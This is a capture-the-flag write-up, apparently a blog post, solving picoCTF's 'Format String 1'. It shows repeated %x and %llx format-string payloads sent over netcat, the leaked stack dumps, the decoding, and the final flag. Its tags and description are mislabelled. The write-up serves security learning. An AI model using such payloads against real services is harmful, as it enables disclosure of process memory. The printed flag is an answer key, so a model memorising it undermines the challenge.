---
layout: post
title:  "Format String 1"
description: Exploiting a simple number search binary game
date:   2024-08-25
tags: ["Binary", "Programming", "Binary Search"]
category: [CTF,N00bzCTF]
---

# Challenge Info
Patrick and Sponge Bob were really happy with those
orders you made for them, but now they're curious
about the secret menu. Find it, and along the way,
maybe you'll find something else of interest!

Download the binary [here](https://artifacts.picoctf.net/c_mimas/82/format-string-1).

Download the source [here](https://artifacts.picoctf.net/c_mimas/82/format-string-1.c).

Connect with the challenge instance here:
`nc mimas.picoctf.net <port>`

author: Connor Chang

![format string 1](/assets/img/formatstring-1/formatstring1.png)

## Attempts

Upon connecting to the netcat listener, we're prompted: `Give me your order and I'll read it back to you:`

Because of the name of the challenge; "**Format String** 1", we already get a pretty big hint. Just from experience, I know that `%x` can be used in format string vulnerabilities to either dump or navigate memory stacks. Naturally, this is the route I took.

```
~ > nc mimas.picoctf.net 63183                               INT 18s
Give me your order and I'll read it back to you:
%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,
Here's your order: 402118,0,6377ea00,0,a64880,a347834,b4da5590,6356fe60,637944d0,1,b4da5660,0,0,6f636970,6d316e34,33317937,3431665f,64303935,7,637968d8,7,74307250,6c797453,9,637a7de9,63578098,637944d0,0,b4da5670,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,252c7825,2c78252c,78252c78,454d4100,6e656c6c,4c564c48,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
Bye!
```

After pasting this into [Cyberchef](https://gchq.github.io/CyberChef/) with "From Hex" selected, I started to notice what might be a flag.

![possible flag](/assets/img/formatstring-1/possibleflag.png)

## Solution

After inspecting the initial output, I decided to modify my format string to use `%llx` instead of `%x`. The `ll` modifier stands for "long long," which in C is a data type representing a 64-bit integer. By using `%llx`, I ensured that each stack read would capture a full 64-bit value, meaning 16 hexadecimal digits would be printed instead of just 8. This is important because the flag or other useful data might be stored in a location that requires reading all 16 bytes (instead of 8) to be fully captured.

After using this adjustment, with commas `,` to clearly separate each stack, I got a different result:


```
~ > nc mimas.picoctf.net 63183                            INT 1m 53s
Give me your order and I'll read it back to you:
%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,
Here's your order: 402118,0,7aaeacfeba00,0,1c1f880,a347834,7ffd67ec6cc0,7aaeacddce60,7aaead0014d0,1,7ffd67ec6d90,0,0,7b4654436f636970,355f31346d316e34,3478345f33317937,35365f673431665f,7d313464303935,7,7aaead0038d8,2300000007,206e693374307250,a336c797453,9,7aaead014de9,7aaeacde5098,7aaead0014d0,0,7ffd67ec6da0,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,
Bye!
```

I decided to put these hex values through Cyberchef again, and saw what's definitely an encoded flag:

![possible flag](/assets/img/formatstring-1/possibleflag2.png)

After removing the null values, I was left with this:

![jumbled flag](/assets/img/formatstring-1/jumbledflag.png)

From here, the challenge is mostly nonsensical decoding, and it gets really bad (there is a reason it's < 50% positive reviews). I went through it anyways, but I probably won't write how I decoded/solved it, it's not really "hacking" and serves no purpose for this challenge.

flag: `picoCTF{4n1m41_57y13_4x4_f14g_65590d41}`
